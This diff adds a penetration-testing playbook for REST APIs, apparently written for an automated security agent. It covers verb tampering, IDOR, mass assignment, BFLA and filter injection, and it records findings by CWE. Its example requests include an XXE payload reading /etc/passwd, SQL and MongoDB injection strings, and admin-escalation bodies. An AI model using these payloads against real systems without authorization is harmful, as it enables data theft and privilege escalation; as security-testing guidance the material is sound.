@@ -1,0 +1,252 @@
+SCOPE: REST API generic attack surface — enumerate endpoints, bypass authorization on HTTP verb and content-type dimensions, exploit mass-assignment and IDOR, and find access control gaps across all resource types.
+
+## TARGETS
+
+- Base API paths: `/api/`, `/api/v1/`, `/api/v2/`, `/v1/`, `/v2/`, `/internal/`, `/private/`, `/admin/`, `/manage/`
+- Versioned endpoints: discover by incrementing version number in path and header
+- OpenAPI/Swagger: `/swagger.json`, `/openapi.json`, `/api-docs`, `/swagger-ui.html`, `/api/swagger`, `/api/openapi`
+- JS bundle string extraction: grep for fetch(), axios(), XMLHttpRequest calls with hardcoded API paths
+- GraphQL as REST: `/graphql/rest`, `/api/rest`
+- Health and debug: `/healthz`, `/health`, `/debug`, `/metrics`, `/_debug`, `/status`, `/ping`, `/actuator/**`
+
+## TECHNIQUES
+
+1. **HTTP verb tampering**
+   APIs often implement auth checks on expected verbs but not on all verbs. A read-only `GET` route may accept `POST`, `PUT`, or `PATCH` with unintended side effects. A `DELETE` endpoint may process without an Authorization header if the developer forgot to add the middleware.
+
+   ```
+   # Baseline: GET /api/users/123 requires auth
+   GET /api/users/123
+   Authorization: Bearer <token>
+   200 OK
+
+   # Tamper: try DELETE without auth
+   DELETE /api/users/123
+   (no Authorization header)
+   200 OK → {"deleted":true}   ← auth not enforced on DELETE verb
+
+   # Also try: HEAD, OPTIONS, TRACE, PATCH, PUT, CONNECT
+   OPTIONS /api/admin/users
+   Allow: GET, POST, PUT, DELETE   ← reveals all supported methods
+   ```
+
+   Map `Allow` headers from OPTIONS responses to discover undocumented methods. Cross-reference with documented methods.
+
+2. **Content-Type and body format tampering**
+   APIs may parse different content types with different parsers that have different behavior. A JSON endpoint may also accept `application/x-www-form-urlencoded` (bypassing JSON-specific WAF rules) or `text/xml` (enabling XXE).
+
+   ```
+   # Standard JSON:
+   POST /api/users
+   Content-Type: application/json
+   {"username":"admin","admin":false}
+
+   # Tampered to form-encoded:
+   POST /api/users
+   Content-Type: application/x-www-form-urlencoded
+   username=admin&admin=true   ← mass assignment may be parsed differently
+
+   # Tampered to XML (XXE attempt):
+   POST /api/users
+   Content-Type: text/xml
+   <?xml version="1.0"?>
+   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+   <user><username>&xxe;</username></user>
+
+   # JSON with trailing comma or comment (parser quirk detection):
+   POST /api/users
+   Content-Type: application/json
+   {"username":"test",/*comment*/"admin":true,}
+   ```
+
+3. **API version enumeration**
+   Older versions of an API may lack security controls added to the current version. Always enumerate v1, v2, v3, beta, internal, dev, legacy, and test prefixes.
+
+   ```
+   # Current version:
+   GET /api/v3/users/123   → 200 OK (auth required, proper controls)
+
+   # Older versions:
+   GET /api/v1/users/123   → 200 OK (auth not required)
+   GET /api/v2/users/123   → 200 OK (returns more fields including internalNote)
+   GET /api/beta/users/123 → 200 OK (debug fields present)
+   GET /api/internal/users/123 → 200 OK (admin-only data without auth)
+   ```
+
+   Also check version in headers: `API-Version: 1`, `X-API-Version: 1`, `Accept: application/vnd.example.v1+json`.
+
+   Source: version numbers in JS bundles, OpenAPI spec, deprecation headers (`Sunset: Sat, 01 Jan 2022 00:00:00 GMT`), and `Link: </api/v2>; rel="successor-version"`.
+
+4. **Undocumented endpoint discovery**
+   Extract all API paths from: JavaScript bundle `fetch`/`axios` calls, OpenAPI spec (including `x-internal: true` tagged operations), sitemap.xml, robots.txt, admin panel source, mobile APK strings (decompile with apktool), and error message stack traces.
+
+   ```
+   # JS bundle grep for API paths:
+   grep -Eo '"/api/[a-z0-9/_-]+"' bundle.js
+
+   # Common undocumented paths to always probe:
+   /api/admin
+   /api/debug
+   /api/export
+   /api/import
+   /api/bulk
+   /api/batch
+   /api/internal
+   /api/dev
+   /api/test
+   /api/config
+   /api/metrics
+   /api/users/all
+   /api/users/search
+   /api/audit
+   /api/logs
+   ```
+
+5. **Mass assignment via PATCH and PUT**
+   APIs built on ORMs or frameworks that auto-bind request body to model objects may allow clients to set fields they shouldn't control. Test by adding extra fields to PATCH/PUT requests that correspond to privileged model attributes.
+
+   ```
+   # Standard user update (expected):
+   PATCH /api/users/123
+   Authorization: Bearer <token>
+   {"displayName":"Alice"}
+
+   # Mass assignment attempt:
+   PATCH /api/users/123
+   Authorization: Bearer <token>
+   {"displayName":"Alice","role":"admin","emailVerified":true,"plan":"enterprise","credits":99999,"isInternal":true,"passwordHash":"<known-hash>"}
+
+   200 OK → {"id":123,"displayName":"Alice","role":"admin","plan":"enterprise","credits":99999}
+   ```
+
+   Common target fields: `role`, `admin`, `isAdmin`, `plan`, `subscription`, `credits`, `balance`, `permissions`, `groups`, `verified`, `approved`, `status`, `internal`, `passwordHash`, `apiKey`.
+
+6. **IDOR on numeric IDs**
+   Sequential numeric IDs are the most exploitable IDOR pattern. Enumerate IDs around your own (above and below) to access other users' resources.
+
+   ```
+   # Your own resource:
+   GET /api/orders/1001   → your order
+
+   # Adjacent IDs:
+   GET /api/orders/1000   → another user's order (IDOR)
+   GET /api/orders/999    → another user's order (IDOR)
+   GET /api/orders/1002   → another user's order (IDOR)
+
+   # Response comparison: if same schema with different userId → IDOR confirmed
+   ```
+
+   Also test IDOR on: invoices, tickets, messages, documents, reports, payments, applications.
+
+7. **IDOR on UUID and hash-based IDs**
+   UUIDs are not secret — they are often discoverable via other endpoints, logs, emails, shared links, or audit trails. Do not dismiss UUID-based IDs as unexploitable.
+
+   ```
+   # Method 1: harvest UUIDs from list endpoints (even if paginated or sorted)
+   GET /api/admin/users   → returns user UUIDs in response
+
+   # Method 2: UUID from email confirmation or share link
+   # "Your invoice is ready: https://app.example.com/invoices/3f7a1b2c-..."
+
+   # Method 3: UUID predictability check (UUIDv1 includes timestamp + MAC)
+   # If UUIDv1, generate near-future UUIDs to predict not-yet-created resources
+
+   GET /api/invoices/3f7a1b2c-4d5e-6f7a-8b9c-0d1e2f3a4b5c   ← another user's invoice
+   ```
+
+8. **Batch endpoint IDOR and authorization bypass**
+   Batch endpoints process multiple IDs in a single request. If authorization is only checked at the batch level (user is authenticated) rather than for each item, mix your IDs with victims' IDs.
+
+   ```
+   POST /api/orders/batch-get
+   Authorization: Bearer <attacker-token>
+   {"ids":["<your-order-id>","<victim-order-id-1>","<victim-order-id-2>"]}
+
+   200 OK → [
+     {"id":"<your-order>","userId":"<you>","items":[...]},
+     {"id":"<victim-order>","userId":"<victim>","items":[...]},   ← IDOR
+     {"id":"<victim-order>","userId":"<victim>","items":[...]}    ← IDOR
+   ]
+   ```
+
+   Also test bulk delete, bulk update, bulk export endpoints.
+
+9. **BFLA — Broken Function-Level Authorization**
+   Horizontal IDOR is same-role access to another user's data. BFLA is vertical: accessing admin or privileged functions with a regular user token. Map all endpoints, then probe admin-tier endpoints with low-privilege tokens.
+
+   ```
+   # Admin-tier endpoints (discovered from JS bundle or OpenAPI x-internal):
+   GET /api/admin/users
+   POST /api/admin/users/<id>/impersonate
+   DELETE /api/admin/users/<id>
+   GET /api/admin/audit-log
+   POST /api/admin/config
+
+   # Test each with regular user Bearer token:
+   GET /api/admin/users
+   Authorization: Bearer <regular-user-token>
+
+   200 OK → [list of all users]   ← BFLA confirmed
+   ```
+
+10. **Excessive data exposure**
+    APIs return more fields than the UI displays. Compare raw API response to UI rendering — fields present in JSON but not shown in UI are candidates for sensitive data. Also diff response between `GET /api/users/123` (your own) and `GET /api/users/456` (another user's) — the other user's response should not include private fields.
+
+    ```
+    GET /api/users/456
+    Authorization: Bearer <your-token>
+
+    200 OK → {
+      "id": 456,
+      "displayName": "Bob",
+      "email": "bob@example.com",       ← not shown in UI (sensitive)
+      "phoneNumber": "+15551234567",      ← not shown in UI (sensitive)
+      "internalScore": 42,                ← internal field exposed
+      "stripeCustomerId": "cus_...",      ← PII/billing reference exposed
+      "passwordResetToken": "abc123"      ← CRITICAL: token exposed
+    }
+    ```
+
+11. **Pagination off-by-one and missing pagination auth**
+    Pagination parameters (`page`, `offset`, `limit`, `cursor`) are often not bounded or validated for authorization. Test: request page 0 when 1 is the minimum, request `limit=999999`, use negative offsets, and request a cursor from one user's session in another user's session.
+
+    ```
+    GET /api/messages?page=-1&limit=99999   → may return all messages from all users
+    GET /api/documents?offset=0&limit=10000 → bulk export without explicit export permission
+
+    # Cursor from user A's session used in user B's session:
+    GET /api/messages?cursor=<user-A-cursor>
+    Authorization: Bearer <user-B-token>
+    → may return messages before user A's cursor (cross-user data)
+    ```
+
+12. **Filter injection**
+    API filter parameters (`?filter=`, `?where=`, `?q=`, `?search=`) that pass user input to database queries or ORM `where` clauses may accept MongoDB operators, SQL fragments, or LDAP filter syntax.
+
+    ```
+    # MongoDB operator injection:
+    GET /api/users?filter[role][$ne]=user   → returns all non-user (admin) accounts
+    GET /api/users?filter[password][$gt]=   → returns all users where password field exists
+
+    # ORM filter injection (Rails/Django/Laravel):
+    GET /api/orders?where=1%3D1            → WHERE 1=1 (return all)
+    GET /api/orders?status=active%27+OR+1%3D1+--   → SQL injection attempt
+
+    # Field selector injection:
+    GET /api/users/123?fields=id,email,passwordHash   → returns passwordHash if selector not allowlisted
+    GET /api/users/123?include=adminSettings           → may include associated admin-only relation
+    ```
+
+## WHAT TO RECORD
+
+When calling `mantis_record_finding`, populate:
+
+- `title`: e.g. "IDOR on /api/orders/{id} — sequential integer IDs expose all orders", "BFLA: regular user token accepted on /api/admin/users", "Mass assignment allows role escalation via PATCH /api/users"
+- `severity`: `critical` (BFLA to admin, mass assignment to admin role, bulk data dump), `high` (IDOR to PII, excessive data exposure of sensitive fields), `medium` (verb tampering, version enumeration with data), `low` (endpoint disclosure, filter field disclosure)
+- `url`: exact URL including parameters
+- `method`: HTTP method used
+- `request_headers`: Authorization header (truncate token)
+- `request_body`: the payload sent
+- `response_status` and `response_body_excerpt`: evidence of the finding
+- `evidence_notes`: explain what auth check was missing, what the intended behavior should be, and quantify impact (e.g., "all 50,000 user records accessible")
+- `cwe`: CWE-639 (IDOR); CWE-285 (BFLA/Improper Authorization); CWE-915 (Mass Assignment); CWE-200 (Excessive Data Exposure); CWE-89 (SQL Injection via filter)
